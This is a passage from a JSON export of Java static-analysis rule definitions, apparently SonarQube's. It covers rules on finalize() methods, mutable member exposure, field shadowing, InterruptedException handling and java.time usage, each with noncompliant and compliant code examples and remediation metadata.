}\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "convention"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "forClasses",
                    "htmlDesc": "Pattern of classes which should adhere to this constraint. Ex : *<strong>.api.</strong>*",
                    "defaultValue": "**.api.**",
                    "type": "STRING"
                },
                {
                    "key": "exclusion",
                    "htmlDesc": "Pattern of classes which are excluded from adhering to this constraint.",
                    "defaultValue": "**.internal.**",
                    "type": "STRING"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1175",
            "repo": "java",
            "name": "The signature of \"finalize()\" should match that of \"Object.finalize()\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>Object.finalize()</code> is called by the Garbage Collector at some point after the object becomes unreferenced.</p>\n<p>In general, overloading <code>Object.finalize()</code> is a bad idea because:</p>\n<ul>\n  <li> The overload may not be called by the Garbage Collector. </li>\n  <li> Users are not expected to call <code>Object.finalize()</code> and will get confused. </li>\n</ul>\n<p>But beyond that it's a terrible idea to name a method \"finalize\" if it doesn't actually override <code>Object.finalize()</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int finalize(int someParameter) {        // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int someBetterName(int someParameter) {  // Compliant\n  /* ... */\n}\n</pre>",
            "mdDesc": "<p><code>Object.finalize()</code> is called by the Garbage Collector at some point after the object becomes unreferenced.</p>\n<p>In general, overloading <code>Object.finalize()</code> is a bad idea because:</p>\n<ul>\n  <li> The overload may not be called by the Garbage Collector. </li>\n  <li> Users are not expected to call <code>Object.finalize()</code> and will get confused. </li>\n</ul>\n<p>But beyond that it's a terrible idea to name a method \"finalize\" if it doesn't actually override <code>Object.finalize()</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic int finalize(int someParameter) {        // Noncompliant\n  /* ... */\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic int someBetterName(int someParameter) {  // Compliant\n  /* ... */\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2384",
            "repo": "java",
            "name": "Mutable members should not be stored or returned directly",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Mutable objects are those whose state can be changed. For instance, an array is mutable, but a String is not. Mutable class members should never be\nreturned to a caller or accepted and stored directly. Doing so leaves you vulnerable to unexpected changes in your class state.</p>\n<p>Instead use an unmodifiable <code>Collection</code> (via <code>Collections.unmodifiableCollection</code>,\n<code>Collections.unmodifiableList</code>, ...) or make a copy of the mutable object, and store or return the copy instead.</p>\n<p>This rule checks that arrays, collections and Dates are not stored or returned directly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A {\n  private String [] strings;\n\n  public A () {\n    strings = new String[]{\"first\", \"second\"};\n  }\n\n  public String [] getStrings() {\n    return strings; // Noncompliant\n  }\n\n  public void setStrings(String [] strings) {\n    this.strings = strings;  // Noncompliant\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {\"first\", \"second\"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = \"yellow\";  // a.strings = {\"yellow\", \"second\"};\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  private String [] strings;\n\n  public A () {\n    strings = new String[]{\"first\", \"second\"};\n  }\n\n  public String [] getStrings() {\n    return strings.clone();\n  }\n\n  public void setStrings(String [] strings) {\n    this.strings = strings.clone();\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {\"first\", \"second\"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = \"yellow\";  // a.strings = {\"first\", \"second\"};\n  }\n}\n\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/374\">MITRE, CWE-374</a> - Passing Mutable Objects to an Untrusted Method </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/375\">MITRE, CWE-375</a> - Returning a Mutable Object to an Untrusted Caller </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OTdGBQ\">CERT, OBJ05-J.</a> - Do not return references to private mutable class members </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HTdGBQ\">CERT, OBJ06-J.</a> - Defensively copy mutable inputs and mutable internal components\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzZGBQ\">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>\n</ul>",
            "mdDesc": "<p>Mutable objects are those whose state can be changed. For instance, an array is mutable, but a String is not. Mutable class members should never be\nreturned to a caller or accepted and stored directly. Doing so leaves you vulnerable to unexpected changes in your class state.</p>\n<p>Instead use an unmodifiable <code>Collection</code> (via <code>Collections.unmodifiableCollection</code>,\n<code>Collections.unmodifiableList</code>, ...) or make a copy of the mutable object, and store or return the copy instead.</p>\n<p>This rule checks that arrays, collections and Dates are not stored or returned directly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass A {\n  private String [] strings;\n\n  public A () {\n    strings = new String[]{\"first\", \"second\"};\n  }\n\n  public String [] getStrings() {\n    return strings; // Noncompliant\n  }\n\n  public void setStrings(String [] strings) {\n    this.strings = strings;  // Noncompliant\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {\"first\", \"second\"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = \"yellow\";  // a.strings = {\"yellow\", \"second\"};\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nclass A {\n  private String [] strings;\n\n  public A () {\n    strings = new String[]{\"first\", \"second\"};\n  }\n\n  public String [] getStrings() {\n    return strings.clone();\n  }\n\n  public void setStrings(String [] strings) {\n    this.strings = strings.clone();\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {\"first\", \"second\"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = \"yellow\";  // a.strings = {\"first\", \"second\"};\n  }\n}\n\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/374\">MITRE, CWE-374</a> - Passing Mutable Objects to an Untrusted Method </li>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/375\">MITRE, CWE-375</a> - Returning a Mutable Object to an Untrusted Caller </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OTdGBQ\">CERT, OBJ05-J.</a> - Do not return references to private mutable class members </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HTdGBQ\">CERT, OBJ06-J.</a> - Defensively copy mutable inputs and mutable internal components\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzZGBQ\">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>\n</ul>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "unpredictable"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2387",
            "repo": "java",
            "name": "Child class fields should not shadow parent class fields",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and you'll get confusion at\nbest, chaos at worst. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripe;  // Noncompliant\n  private static Color FLESH; // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripened;\n  private static Color FLESH_COLOR;\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule ignores same-name fields that are <code>static</code> in both the parent and child classes. This rule ignores <code>private</code> parent\nclass fields, but in all other such cases, the child class field should be renamed.</p>\n<pre>\npublic class Fruit {\n  private Season ripe;\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private Season ripe;  // Compliant as parent field 'ripe' is anyway not visible from Raspberry\n  // ...\n}\n</pre>",
            "mdDesc": "<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and you'll get confusion at\nbest, chaos at worst. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripe;  // Noncompliant\n  private static Color FLESH; // Noncompliant\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripened;\n  private static Color FLESH_COLOR;\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule ignores same-name fields that are <code>static</code> in both the parent and child classes. This rule ignores <code>private</code> parent\nclass fields, but in all other such cases, the child class field should be renamed.</p>\n<pre>\npublic class Fruit {\n  private Season ripe;\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private Season ripe;  // Compliant as parent field 'ripe' is anyway not visible from Raspberry\n  // ...\n}\n</pre>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1174",
            "repo": "java",
            "name": "\"Object.finalize()\" should remain protected (versus public) when overriding",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The contract of the <code>Object.finalize()</code> method is clear: only the Garbage Collector is supposed to call this method.</p>\n<p>Making this method public is misleading, because it implies that any caller can use it.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  @Override\n  public void finalize() {    // Noncompliant\n    /* ... */\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/583.html\">MITRE, CWE-583</a> - finalize() Method Declared Public </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "mdDesc": "<p>The contract of the <code>Object.finalize()</code> method is clear: only the Garbage Collector is supposed to call this method.</p>\n<p>Making this method public is misleading, because it implies that any caller can use it.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  @Override\n  public void finalize() {    // Noncompliant\n    /* ... */\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/583.html\">MITRE, CWE-583</a> - finalize() Method Declared Public </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2142",
            "repo": "java",
            "name": "\"InterruptedException\" should not be ignored",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as \"ignoring\". The\nthrowing of the <code>InterruptedException</code> clears the interrupted state of the Thread, so if the exception is not handled properly the fact\nthat the thread was interrupted will be lost. Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up\nthe method's state - or the thread should be re-interrupted by calling <code>Thread.interrupt()</code> even if this is supposed to be a\nsingle-threaded application. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted -\nprobably without finishing its task.</p>\n<p>Similarly, the <code>ThreadDeath</code> exception should also be propagated. According to its JavaDoc:</p>\n<blockquote>\n  <p>If <code>ThreadDeath</code> is caught by a method, it is important that it be rethrown so that the thread actually dies.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void run () {\n  try {\n    while (true) {\n      // do stuff\n    }\n  }catch (InterruptedException e) { // Noncompliant; logging is not enough\n    LOGGER.log(Level.WARN, \"Interrupted!\", e);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void run () {\n  try {\n    while (true) {\n      // do stuff\n    }\n  }catch (InterruptedException e) {\n    LOGGER.log(Level.WARN, \"Interrupted!\", e);\n    // Restore interrupted state...\n    Thread.currentThread().interrupt();\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/391.html\">MITRE, CWE-391</a> - Unchecked Error Condition </li>\n  <li> <a href=\"https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1\">Dealing with InterruptedException</a> </li>\n</ul>",
            "mdDesc": "<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as \"ignoring\". The\nthrowing of the <code>InterruptedException</code> clears the interrupted state of the Thread, so if the exception is not handled properly the fact\nthat the thread was interrupted will be lost. Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up\nthe method's state - or the thread should be re-interrupted by calling <code>Thread.interrupt()</code> even if this is supposed to be a\nsingle-threaded application. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted -\nprobably without finishing its task.</p>\n<p>Similarly, the <code>ThreadDeath</code> exception should also be propagated. According to its JavaDoc:</p>\n<blockquote>\n  <p>If <code>ThreadDeath</code> is caught by a method, it is important that it be rethrown so that the thread actually dies.</p>\n</blockquote>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void run () {\n  try {\n    while (true) {\n      // do stuff\n    }\n  }catch (InterruptedException e) { // Noncompliant; logging is not enough\n    LOGGER.log(Level.WARN, \"Interrupted!\", e);\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void run () {\n  try {\n    while (true) {\n      // do stuff\n    }\n  }catch (InterruptedException e) {\n    LOGGER.log(Level.WARN, \"Interrupted!\", e);\n    // Restore interrupted state...\n    Thread.currentThread().interrupt();\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/391.html\">MITRE, CWE-391</a> - Unchecked Error Condition </li>\n  <li> <a href=\"https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1\">Dealing with InterruptedException</a> </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cwe",
                "error-handling",
                "multi-threading"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2143",
            "repo": "java",
            "name": "\"java.time\" classes should be used for dates and times",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The old, much-derided <code>Date</code> and <code>Calendar</code> classes have always been confusing and difficult to use properly, particularly in\na multi-threaded context. <code>JodaTime</code> has long been a popular alternative, but now an even better option is built-in. Java 8's JSR 310\nimplementation offers specific classes for:</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Class</th>\n      <th>Use for</th>\n    </tr>\n    <tr>\n      <td>LocalDate</td>\n      <td>a date, without time of day, offset, or zone</td>\n    </tr>\n    <tr>\n      <td>LocalTime</td>\n      <td>the time of day, without date, offset, or zone</td>\n    </tr>\n    <tr>\n      <td>LocalDateTime</td>\n      <td>the date and time, without offset, or zone</td>\n    </tr>\n    <tr>\n      <td>OffsetDate</td>\n      <td>a date with an offset such as +02:00, without time of day, or zone</td>\n    </tr>\n    <tr>\n      <td>OffsetTime</td>\n      <td>the time of day with an offset such as +02:00, without date, or zone</td>\n    </tr>\n    <tr>\n      <td>OffsetDateTime</td>\n      <td>the date and time with an offset such as +02:00, without a zone</td>\n    </tr>\n    <tr>\n      <td>ZonedDateTime</td>\n      <td>the date and time with a time zone and offset</td>\n    </tr>\n    <tr>\n      <td>YearMonth</td>\n      <td>a year and month</td>\n    </tr>\n    <tr>\n      <td>MonthDay</td>\n      <td>month and day</td>\n    </tr>\n    <tr>\n      <td>Year/MonthOfDay/DayOfWeek/...</td>\n      <td>classes for the important fields</td>\n    </tr>\n    <tr>\n      <td>DateTimeFields</td>\n      <td>stores a map of field-value pairs which may be invalid</td>\n    </tr>\n    <tr>\n      <td>Calendrical</td>\n      <td>access to the low-level API</td>\n    </tr>\n    <tr>\n      <td>Period</td>\n      <td>a descriptive amount of time, such as \"2 months and 3 days\"</td>\n    </tr>\n  </tbody>\n</table>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDate now = new Date();  // Noncompliant\nDateFormat df = new SimpleDateFormat(\"dd.MM.yyyy\");\nCalendar christmas  = Calendar.getInstance();  // Noncompliant\nchristmas.setTime(df.parse(\"25.12.2020\"));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nLocalDate now = LocalDate.now();  // gets calendar date. no time component\nLocalTime now2 = LocalTime.now(); // gets current time. no date component\nLocalDate christmas = LocalDate.of(2020,12,25);\n</pre>",
            "mdDesc": "<p>The old, much-derided <code>Date</code> and <code>Calendar</code> classes have always been confusing and difficult to use properly, particularly in\na multi-threaded context. <code>JodaTime</code> has long been a popular alternative, but now an even better option is built-in. Java 8's JSR 310\nimplementation offers specific classes for:</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Class</th>\n      <th>Use for</th>\n    </tr>\n    <tr>\n      <td>LocalDate</td>\n      <td>a date, without time of day, offset, or zone</td>\n    </tr>\n    <tr>\n      <td>LocalTime</td>\n      <td>the time of day, without date, offset, or zone</td>\n    </tr>\n    <tr>\n      <td>LocalDateTime</td>\n      <td>the date and time, without offset, or zone</td>\n    </tr>\n    <tr>\n      <td>OffsetDate</td>\n      <td>a date with an offset such as +02:00, without time of day, or zone</td>\n    </tr>\n    <tr>\n      <td>OffsetTime</td>\n      <td>the time of day with an offset such as +02:00, without date, or zone</td>\n    </tr>\n    <tr>\n      <td>OffsetDateTime</td>\n      <td>the date and time with an offset such as +02:00, without a zone</td>\n    </tr>\n    <tr>\n      <td>ZonedDateTime</td>\n      <td>the date and time with a time zone and offset</td>\n    </tr>\n    <tr>\n      <td>YearMonth</td>\n      <td>a year and month</td>\n    </tr>\n    <tr>\n      <td>MonthDay</td>\n      <td>month and day</td>\n    </tr>\n    <tr>\n      <td>Year/MonthOfDay/DayOfWeek/...</td>\n      <td>classes for the important fields</td>\n    </tr>\n    <tr>\n      <td>DateTimeFields</td>\n      <td>stores a map of field-value pairs which may be invalid</td>\n    </tr>\n    <tr>\n      <td>Calendrical</td>\n      <td>access to the low-level API</td>\n    </tr>\n    <tr>\n      <td>Period</td>\n      <td>a descriptive amount of time, such as \"2 months and 3 days\"</td>\n    </tr>\n  </tbody>\n</table>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDate now = new Date();  // Noncompliant\nDateFormat df = new SimpleDateFormat(\"dd.MM.yyyy\");\nCalendar christmas  = Calendar.getInstance();  // Noncompliant\nchristmas.setTime(df.parse(\"25.12.2020\"));\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nLocalDate now = LocalDate.now();  // gets calendar date. no time component\nLocalTime now2 = LocalTime.now(); // gets current time. no date component\nLocalDate christmas = LocalDate.of(2020,12,25);\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "java8",
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "15min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "15min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "15min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "15min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4201",
            "repo": "java",
            "name": "Null checks should not be used with \"instanceof\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There's no need to null test in conjunction with an <code>instanceof</code> test. <code>null</code> is not an <code>instanceof</code> anything, so\na null check is redundant.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x != null &amp;&amp; x instanceof MyClass) { ... }  // Noncompliant\n\nif (x == null || ! x instanceof MyClass) { ... } // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (x instanceof MyClass) { ... }\n\nif (! x instanceof MyClass) { ... }\n</pre>",
            "mdDesc": "<p>There's no need to null test in conjunction with an <code>instanceof</code> test. <code>null</code> is not an <code>instanceof</code> anything, so\na null check is redundant.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (x != null &amp;&amp; x instanceof MyClass) { ... }  // Noncompliant\n\nif (x == null || ! x instanceof MyClass) { ... } // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (x instanceof MyClass) { ... }\n\nif (! x instanceof MyClass) { ... }\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "redundant"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5411",
            "repo": "java",
            "name": "Boxed \"Boolean\" should be avoided in boolean expressions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When boxed type <code>java.lang.Boolean</code> is used as an expression it will throw <code>NullPointerException</code> if the value is\n<code>null</code> as defined in <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8\">Java Language Specification §5.1.8\nUnboxing Conversion</a>.</p>\n<p>It is safer to avoid such conversion altogether and handle the <code>null</code> value explicitly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nBoolean b = getBoolean();\nif (b) {  // Noncompliant, it will throw NPE when b == null\n  foo();\n} else {\n  bar();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nBoolean b = getBoolean();\nif (Boolean.TRUE.equals(b)) {\n  foo();\n} else {\n  bar();  // will be invoked for both b == false and b == null\n}\n</pre>\n<h2>See</h2>\n<p> * <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8\">Java Language Specification §5.1.8 Unboxing Conversion</a></p>",
            "mdDesc": "<p>When boxed type <code>java.lang.Boolean</code> is used as an expression it will throw <code>NullPointerException</code> if the value is\n<code>null</code> as defined in <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8\">Java Language Specification §5.1.8\nUnboxing Conversion</a>.</p>\n<p>It is safer to avoid such conversion altogether and handle the <code>null</code> value explicitly.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nBoolean b = getBoolean();\nif (b) {  // Noncompliant, it will throw NPE when b == null\n  foo();\n} else {\n  bar();\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nBoolean b = getBoolean();\nif (Boolean.TRUE.equals(b)) {\n  foo();\n} else {\n  bar();  // will be invoked for both b == false and b == null\n}\n</pre>\n<h2>See</h2>\n<p> * <a href=\"https://docs.oracle.com/javase/specs/jls/se8/html/jls-5.html#jls-5.1.8\">Java Language Specification §5.1.8 Unboxing Conversion</a></p>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "pitfall"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2140",
            "repo": "java",
            "name": "Methods of \"Random\" that return floating point values should not be used in random integer generation",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There is no need to multiply the output of <code>Random</code>'s <code>nextDouble</code> method to get a random integer. Use the\n<code>nextInt</code> method instead.</p>\n<p>This rule raises an issue when the return value of any of <code>Random</code>'s methods that return a floating point value is converted to an\ninteger.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nRandom r = new Random();\nint rand = (int)r.nextDouble() * 50;  // Noncompliant way to get a pseudo-random value between 0 and 50\nint rand2 = (int)r.nextFloat(); // Noncompliant; will always be 0;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nRandom r = new Random();\nint rand = r.nextInt(50);  // returns pseudo-random value between 0 and 50\n</pre>",
            "mdDesc": "<p>There is no need to multiply the output of <code>Random</code>'s <code>nextDouble</code> method to get a random integer. Use the\n<code>nextInt</code> method instead.</p>\n<p>This rule raises an issue when the return value of any of <code>Random</code>'s methods that return a floating point value is converted to an\ninteger.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nRandom r = new Random();\nint rand = (int)r.nextDouble() * 50;  // Noncompliant way to get a pseudo-random value between 0 and 50\nint rand2 = (int)r.nextFloat(); // Noncompliant; will always be 0;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nRandom r = new Random();\nint rand = r.nextInt(50);  // returns pseudo-random value between 0 and 50\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S4449",
            "repo": "java",
            "name": "Nullness of parameters should be guaranteed",
